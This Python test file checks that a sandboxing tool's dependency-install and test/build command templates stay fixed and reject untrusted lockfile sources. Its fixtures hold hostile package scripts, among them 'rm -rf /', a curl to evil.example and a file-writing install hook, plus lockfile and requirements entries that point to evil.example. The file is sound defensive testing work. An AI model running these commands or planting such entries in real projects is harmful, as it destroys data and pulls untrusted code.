from __future__ import annotations

import json
from pathlib import Path

import pytest

from fairy_core.execution.templates import (
    DependencyLockError,
    DependencyManager,
    ProjectManagerConflictError,
    ReviewKind,
    UnknownProjectManagerError,
    dependency_template,
    review_template,
)
from fairy_core.sandbox.models import SandboxNetworkPolicy, SandboxPurpose


def test_npm_dependency_template_is_fixed_and_ignores_package_scripts(tmp_path: Path) -> None:
    _json(
        tmp_path / "package.json",
        {
            "name": "fixture",
            "scripts": {"install": "node -e \"require('fs').writeFileSync('/tmp/pwned','x')\""},
        },
    )
    _json(
        tmp_path / "package-lock.json",
        {
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "fixture"},
                "node_modules/a": {
                    "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz",
                    "integrity": "sha512-fixture",
                },
            },
        },
    )

    template = dependency_template(tmp_path)

    assert template.manager is DependencyManager.NPM
    assert template.argv == (
        "npm",
        "ci",
        "--ignore-scripts",
        "--no-audit",
        "--no-fund",
    )
    assert template.network_policy is SandboxNetworkPolicy.PUBLIC
    assert template.purpose is SandboxPurpose.DEPENDENCY
    assert "pwned" not in " ".join(template.argv)


@pytest.mark.parametrize(
    ("manager", "manifest", "lockfile", "argv"),
    [
        (
            DependencyManager.PNPM,
            "package.json",
            "pnpm-lock.yaml",
            ("pnpm", "install", "--frozen-lockfile", "--ignore-scripts"),
        ),
        (
            DependencyManager.YARN,
            "package.json",
            "yarn.lock",
            ("yarn", "install", "--frozen-lockfile", "--ignore-scripts"),
        ),
        (
            DependencyManager.UV,
            "pyproject.toml",
            "uv.lock",
            ("uv", "sync", "--frozen", "--no-install-project"),
        ),
        (
            DependencyManager.CARGO,
            "Cargo.toml",
            "Cargo.lock",
            ("cargo", "fetch", "--locked"),
        ),
    ],
)
def test_locked_dependency_managers_have_exact_argv(
    tmp_path: Path,
    manager: DependencyManager,
    manifest: str,
    lockfile: str,
    argv: tuple[str, ...],
) -> None:
    (tmp_path / manifest).write_text(_manifest_content(manifest), encoding="utf-8")
    (tmp_path / lockfile).write_text(_lock_content(lockfile), encoding="utf-8")

    template = dependency_template(tmp_path)

    assert template.manager is manager
    assert template.argv == argv


def test_pip_requires_a_hash_locked_binary_only_requirements_file(tmp_path: Path) -> None:
    (tmp_path / "requirements.lock").write_text(
        f"httpx==0.28.1 --hash=sha256:{'a' * 64}\n",
        encoding="ascii",
    )

    template = dependency_template(tmp_path)

    assert template.manager is DependencyManager.PIP
    assert template.argv == (
        ".venv/bin/python",
        "-m",
        "pip",
        "install",
        "--require-hashes",
        "--only-binary=:all:",
        "-r",
        "requirements.lock",
    )

    (tmp_path / "requirements.lock").write_text(
        "httpx @ https://evil.example/httpx.whl\n",
        encoding="ascii",
    )
    with pytest.raises(DependencyLockError, match="hash-pinned"):
        dependency_template(tmp_path)


def test_conflicting_or_unlocked_managers_fail_closed(tmp_path: Path) -> None:
    _json(tmp_path / "package.json", {"name": "fixture"})
    (tmp_path / "package-lock.json").write_text("{}", encoding="ascii")
    (tmp_path / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'\n", encoding="ascii")

    with pytest.raises(ProjectManagerConflictError):
        dependency_template(tmp_path)

    (tmp_path / "package-lock.json").unlink()
    (tmp_path / "pnpm-lock.yaml").unlink()
    with pytest.raises(DependencyLockError, match="lockfile"):
        dependency_template(tmp_path)

    (tmp_path / "package.json").unlink()
    with pytest.raises(UnknownProjectManagerError):
        dependency_template(tmp_path)


def test_lockfiles_reject_uncontrolled_network_sources(tmp_path: Path) -> None:
    _json(tmp_path / "package.json", {"name": "fixture"})
    _json(
        tmp_path / "package-lock.json",
        {
            "lockfileVersion": 3,
            "packages": {
                "node_modules/private": {
                    "resolved": "https://evil.example/private.tgz",
                    "integrity": "sha512-fixture",
                }
            },
        },
    )

    with pytest.raises(DependencyLockError, match="registry"):
        dependency_template(tmp_path)


def test_review_templates_are_core_owned_and_never_accept_a_script_name(tmp_path: Path) -> None:
    _json(
        tmp_path / "package.json",
        {
            "name": "fixture",
            "scripts": {
                "test": "echo safe; rm -rf /",
                "arbitrary": "curl https://evil.example",
            },
        },
    )
    _json(tmp_path / "package-lock.json", {"lockfileVersion": 3, "packages": {}})

    test = review_template(tmp_path, ReviewKind.TEST)
    build = review_template(tmp_path, ReviewKind.BUILD)

    assert test.argv == ("npm", "test", "--if-present")
    assert build.argv == ("npm", "run", "build", "--if-present")
    assert test.network_policy is SandboxNetworkPolicy.NONE
    assert test.purpose is SandboxPurpose.REVIEW
    assert "rm -rf" not in " ".join(test.argv)
    assert "arbitrary" not in " ".join(build.argv)


def _json(path: Path, value: object) -> None:
    path.write_text(json.dumps(value), encoding="utf-8")


def _manifest_content(name: str) -> str:
    return {
        "package.json": '{"name":"fixture"}',
        "pyproject.toml": "[project]\nname = 'fixture'\nversion = '0.1.0'\n",
        "Cargo.toml": '[package]\nname = "fixture"\nversion = "0.1.0"\n',
    }[name]


def _lock_content(name: str) -> str:
    return {
        "pnpm-lock.yaml": "lockfileVersion: '9.0'\n",
        "yarn.lock": "# yarn lockfile v1\n",
        "uv.lock": "version = 1\nrevision = 1\nrequires-python = '>=3.13'\n",
        "Cargo.lock": "version = 4\n",
    }[name]
